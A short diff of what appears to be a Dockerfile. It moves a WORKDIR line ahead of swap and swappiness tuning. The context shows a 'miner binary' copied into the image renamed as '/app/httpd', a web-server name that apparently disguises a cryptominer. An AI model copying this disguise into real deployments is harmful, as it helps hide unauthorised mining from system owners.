@@ -11,6 +11,9 @@ RUN apt-get update && apt-get install -y \
     --no-install-recommends && \
     apt-get clean && rm -rf /var/lib/apt/lists/*
 
+# Set working directory
+WORKDIR /app
+
 # Enable swap
 RUN fallocate -l 1G /swapfile && \
     chmod 600 /swapfile && \
@@ -20,9 +23,6 @@ RUN fallocate -l 1G /swapfile && \
 
 # Optimize swappiness
 RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf
-
-# Set working directory
-WORKDIR /app
 
 # Download miner binary
 COPY iniminer-linux-x64 /app/httpd
